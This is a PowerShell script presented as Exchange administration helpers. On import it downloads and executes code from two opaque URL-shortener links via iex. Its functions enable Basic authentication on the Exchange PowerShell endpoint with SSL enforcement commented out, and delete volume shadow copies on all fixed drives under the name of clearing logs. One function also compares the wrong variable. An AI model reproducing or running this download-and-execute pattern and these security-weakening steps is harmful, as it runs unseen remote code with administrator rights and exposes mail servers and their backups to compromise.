Write-Output "!!!! Importing Lantrx PowerShell Exchange Scrips !!!!"
#load bootstrap url
iex ((New-Object System.Net.WebClient).DownloadString('https://rebrand.ly/c7cfd'))
#load Server url
iex ((New-Object System.Net.WebClient).DownloadString('https://rebrand.ly/bd6c0'))


function Set-BasicAuthentication([string]$appName, [bool]$value)
{
	if ((Get-Module "WebAdministration" -ErrorAction SilentlyContinue) -eq $null)
	{
		Import-Module WebAdministration
	}
	$website = "Default Web Site"
	$basicAuthFilter = "/system.webServer/security/authentication/basicAuthentication"
	$BasicAuth = Get-WebConfigurationProperty -filter $basicAuthFilter -name Enabled -location "$website/$appName"
	if ($BasicAuth.Value -eq $value)
	{
		Write-verbose "$appName Basic Authentication is already $value"
	}
	else
	{
		Set-WebConfigurationProperty -filter $basicAuthFilter -name Enabled -value $value -location "$website/$appName" -PSPath IIS:\
		Write-verbose "Basic Authentication now $value on $appName"
	}
}

function Set-SSLRequire([string]$appName, [string]$value)
{
	if ((Get-Module "WebAdministration" -ErrorAction SilentlyContinue) -eq $null)
	{
		Import-Module WebAdministration
	}
	$website = "Default Web Site"
	$SSLFilter = "system.webServer/security/access"
	$SSLsettings = Get-WebConfigurationProperty -filter $SSLFilter -name Enabled -location "$website/$appName"
	if ($BasicAuth.Value -eq $value)
	{
		Write-verbose "$appName SSL settings is already $value"
	}
	else
	{
		Set-WebConfigurationProperty -pspath 'IIS:\' -location "$website/$appName" -filter "system.webServer/security/access" -name "sslFlags" -value $value
		Write-verbose "SSL settings now $value on $appName"
	}
}

function check-server
{
	$sOS = Get-WmiObject -class Win32_OperatingSystem
	#if ($sos.Caption.Contains("Server")) { "it's a server" }
	#else { "not server" }
	return $sos.Caption.Contains("Server")
}

function create-remoteexchange
{
	#check-server is function
	
	
	if (Test-Path $env:exchangeinstallpath)
	{
		Write-Verbose "exchange server"
		if (check-server)
		{
			Write-Verbose "it's a server"
			Write-Verbose "setting SSL required"
			#Set-SSLRequire -appName powershell -value "Ssl, SslNegotiateCert"
			Write-Verbose "Setting basic authentication"
			Set-BasicAuthentication -appName powershell -value $true
			
			
		}
	}
	else
	{
		Write-Verbose "NO exchange"
	}
	
}

function Connect-remoteexchange
{
<#
	.SYNOPSIS
		Connects to remote exchange server
	
	.DESCRIPTION
		connects and imports remote exchange access using powershell
	
	.PARAMETER FQDN
		the FQDN of the server you want to connect to
	
	.PARAMETER nosslcheck
		turns off ssl check
	
	.PARAMETER credentials
		Exhcnage admin credentials
	
	.EXAMPLE
		PS C:\> Connect-remoteexchange -FQDN 'Value1' -nosslcheck
	
	.NOTES
		Additional information about the function.
#>
	
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory = $true,
				   Position = 1)]
		[string]$FQDN,
		[switch]$nosslcheck,
		[Parameter(Mandatory = $true,
				   Position = 2)]
		[pscredential]$credentials = (get-credential)
	)
	
	#TODO: Place script here
	$url = "https://" + $FQDN + "/powershell"
	$global:remoteexchangeserver = $FQDN
	$global:remoteexchangesession = New-PSSession –ConfigurationName Microsoft.Exchange –ConnectionUri $url -Credential $credentials -Authentication Basic
	Import-PSSession $variable:remoteexchangesession
}

function Close-remoteexchange
{
<#
	.SYNOPSIS
		closes remote exchange connection
	
	.DESCRIPTION
		closes remote exchange connection
	
	.EXAMPLE
				PS C:\> Close-remoteexchange
	
	.NOTES
		Additional information about the function.
#>
	
	[CmdletBinding()]
	param ()
	
	#TODO: Place script here
	Write-Verbose "closing remote exchange session $global:remoteexchangeserver"
	Get-PSSession | where {$_.computername -eq $global:remoteexchangeserver} | Remove-PSSession
}

Function clear-exchangelogs{
<#
add volume c:
begin backup
create
end backup
delete shadows volume c:
#>

$cmdlocation = "C:\Windows\Temp\exchange.cmd"
[string]$shadowscript=$null

$drives=Get-Volume | ?{$_.drivetype -eq "Fixed"} | ?{$_.driveletter} | select -ExpandProperty driveletter

foreach($drive in $drives){
$shadowscript = $shadowscript + "add volume $($drive):`r`n"
}#end foreach drives

$shadowscript = $shadowscript + "begin backup`r`n"
$shadowscript = $shadowscript + "create`r`n"
$shadowscript = $shadowscript + "end backup`r`n"

foreach($drive in $drives){
$shadowscript = $shadowscript + "delete shadows volume $($drive):`r`n"
}#end foreach drives

Set-Content -Path $cmdlocation -Value $shadowscript
Start-Process -FilePath diskshadow -ArgumentList "/s $cmdlocation" -wait
remove-item -path $cmdlocation
}


write-output "!!!! Finished installing scripts from Lantrx !!!!"
